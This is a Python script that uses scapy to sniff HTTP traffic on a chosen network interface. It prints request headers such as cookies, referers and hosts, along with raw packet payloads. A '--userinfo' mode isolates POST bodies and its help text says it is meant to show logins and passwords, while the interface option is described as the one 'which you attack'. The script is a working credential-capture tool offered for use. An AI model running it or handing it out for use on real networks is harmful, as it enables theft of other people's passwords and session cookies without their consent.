#! /usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse, os
def getArg():
   parser = argparse.ArgumentParser()
   parser.add_argument("-i", "--interface", required=True, dest="targetInterface", help="[?] Input interface which you attack", metavar="")
   parser.add_argument("-f", "--filter", dest="filter", help="[?] Write bpf filter", metavar="")

   parser.add_argument("--userinfo", dest="userInfo", default=False, action="store_true", help="[?] Show only user info (login, password)")
   parser.add_argument("-s", "--showAll", dest="showAll", default=False, action="store_true", help="[?] Show all info from all layer")
   parser.add_argument("-r", "--raw", dest="showRaw", default=False, action="store_true", help="[?] Show all info from Raw")

   arg = parser.parse_args()

   if os.getuid() != 0:
       print("Use superuser mode")
       exit()

   if not arg.targetInterface:
       print("Input target Interface")
       exit()

   return arg

def proccessSniffPacket(packet):

    try:
        if packet.haslayer(http.HTTPRequest):
            print(f"---->Referer: {packet[http.HTTPRequest].Referer}")
            print(f"Method: {packet[http.HTTPRequest].Method}")
            print(f"---->Path: {packet[http.HTTPRequest].Path}")
            print(f"HTTP_Version: {packet[http.HTTPRequest].Http_Version}")
            print(f"Content_Type: {packet[http.HTTPRequest].Content_Type}")
            print(f"---->Cookie: {packet[http.HTTPRequest].Cookie}")
            print(f"Expect: {packet[http.HTTPRequest].Expect}")
            print(f"Host: {packet[http.HTTPRequest].Host}")
            print(f"Origin: {packet[http.HTTPRequest].Origin}")
            print(f"Accept: {packet[http.HTTPRequest].Accept}")
            print(f"User_Agent: {packet[http.HTTPRequest].User_Agent}")

            print()
        if packet.haslayer(scapy.Raw):
            print(f"---->load: {packet[http.HTTPRequest].load}")
            print()

    except:
        print(end="")

def onlyUserInfo(packet):
    try:
        if packet.haslayer(http.HTTPRequest) and packet.haslayer(scapy.Raw):
            if b'POST' in packet[http.HTTPRequest].Method:
                print(f"---->url: {packet[http.HTTPRequest].Referer} | Path: {packet[http.HTTPRequest].Path}")
                print(f"---->load: {packet[http.HTTPRequest].load}")
                print()
    except:
        print(end="")

def showRaw(packet):
    try:
        if packet.haslayer(scapy.Raw):
            print(f"---->load: {packet[scapy.Raw].load}")
            print()
    except:
        print(end="")

def sniffer(arg):

    targetInterface = arg.targetInterface
    isOnlyUserInfo = arg.userInfo
    isShowAllInfo = arg.showAll
    isShowRaw = arg.showRaw

    if not arg.filter:
        filter=""
    else:
        filter=arg.filter

    if isShowRaw:
        scapy.sniff(iface=targetInterface, store=False, prn=showRaw, filter=f"{filter}")
    if isShowAllInfo:
        scapy.sniff(iface=targetInterface, store=False, prn=lambda x: x.show(), filter=f"{filter}")
    if isOnlyUserInfo:
        scapy.sniff(iface=targetInterface, store=False, prn=onlyUserInfo, filter=f"{filter}")
    else:
        scapy.sniff(iface=targetInterface, store=False, prn=proccessSniffPacket, filter=f"{filter}")


if __name__ == '__main__':
     sniffer(getArg())